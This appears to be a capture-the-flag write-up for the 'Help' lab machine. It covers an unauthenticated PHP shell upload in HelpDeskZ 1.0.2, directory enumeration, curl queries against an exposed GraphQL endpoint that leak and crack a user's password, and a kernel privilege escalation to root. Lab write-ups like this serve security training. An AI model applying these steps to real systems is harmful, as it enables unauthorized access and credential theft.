By enumerating the existed url, we find:

```

And also, we found this service is powered by `HelpDeskZ`
We found some exploits for this service and we need to use poc to prove the exploits.
`HelpDeskZ 1.0.2 - Arbitrary File Upload`
```
HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.

The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file

controllers httpsgithub.comevolutionscriptHelpDeskZ-1.0tree006662bb856e126a38f2bb76df44a2e4e3d37350controllerssubmit_ticket_controller.php - Line 141
$filename = md5($_FILES['attachment']['name'].time())...$ext;

So by guessing the time the file was uploaded, we can get RCE.

Steps to reproduce

httplocalhosthelpdeskzv=submit_ticket&action=displayForm

Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.

Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded

exploit.py httplocalhosthelpdeskz phpshell.php
```

So we need to get the upload file path to help us get the reverse shell after uploading the reverse shell.

We need to continue enumerate the valid web-contents, because we just live in the root directory of this service.
```
gobuster -u http://10.10.10.121/support -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
# /images (Status: 301)
# /index.php (Status: 200)
# /uploads (Status: 301)
# /css (Status: 301)
# /includes (Status: 301)
# /js (Status: 301)

gobuster -u http://10.10.10.121/support/uploads -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
# /index.php (Status: 302)
# /articles (Status: 301)
# /tickets (Status: 301)
```

After upload the payload from `http://help.htb/support/?v=submit_ticket&action=confirmation` we can use the exploit script to find the payload file in the upload directory, and we just need to curl it to handle the reverse shell.

Note: Due to timezones, the exploit might not work out of the box. This can be fixed by changing the local time to that of the server. The serverâ€™s time can be seen in HTTP Response

Alternatively path:
Let's come to the port 3000
`{"message":"Hi Shiv, To get access please find the credentials with given query"}`

That means we need to use query to get the valid credential.
We have known the version of this service `Node.js Express framework`

Navigating to `/graphql` we encounter an error about the GET parameter.
`GET query missing.`

So let's try `http://help.htb:3000/graphql?query=abc`
`{"errors":[{"message":"Syntax Error GraphQL request (1:1) Unexpected Name \"abc\"\n\n1: abc\n   ^\n","locations":[{"line":1,"column":1}]}]}`

Next we try to query information. A graphql endpoint takes in objects as input. As we need information related to a user lets try a user object,
`curl -s -G http://10.10.10.121:3000/graphql --data-urlencode "query={user}" | jq`
```
{
  "errors": [
    {
      "message": "Field \"user\" of type \"User\" must have a selection of subfields. Did you mean \"user { ... }\"?",
      "locations": [
        {
          "line": 1,
          "column": 2
        }
      ]
    }
  ]
}

```

`curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username} }' | jq`
```
{
  "data": {
    "user": {
      "username": "helpme@helpme.com"
    }
  }
}
```

Now we have get the email, let's continue to check the password.
`curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username,password} }' | jq
```
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}

```
Then crack this md5 hash, we get `godhelpmeplz`
And also we can login successfully
![](images/Pasted%20image%2020241104062255.png)

It looks like a database query terminal, and even we can change the time zone.

So let's try to check the sql-injection.
But to be honest, this SQL injection is too difficult to exploit. If possible, please try a simpler method.

2,shell as root
Firstly, I would want to use `linpeas.sh` to enumerate the machine quickly:
```
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)

That means we can check syslog

uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation

After compilation, and exec it then we can get the root shell.
